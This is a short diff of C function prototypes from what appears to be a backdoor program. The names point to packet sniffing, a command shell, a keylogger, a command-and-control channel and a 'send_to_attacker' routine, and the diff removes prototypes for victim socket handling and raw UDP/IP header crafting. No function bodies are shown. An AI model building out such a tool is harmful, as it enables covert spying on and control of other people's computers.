@@ -20,8 +20,6 @@ const char *builtin_str[] = {
 
 // Function Prototypes
 void options_victim_init(struct options_victim *opts);
-void* select_victim(void* arg);
-void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address);
 void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void convert_uint32t_ip_to_str(uint32_t ip_addr, char *ip, char flag);
@@ -34,10 +32,6 @@ int builtin_cd(char **args);
 int builtin_exit(char **args);
 int launch(char **command_arr, u_char *args);
 void send_to_attacker(u_char *args);
-unsigned short create_udp_header(struct udphdr* uh, uint16_t port);
-unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args);
-void initialize_victim_server(struct options_victim *opts);
-void* activate_select(void* arg);
 void* activate_keylogger(void* arg);
 void* activate_cnc(void* arg);
 void cnc_select_call(struct options_victim *opts, struct sockaddr_in cnc_address);
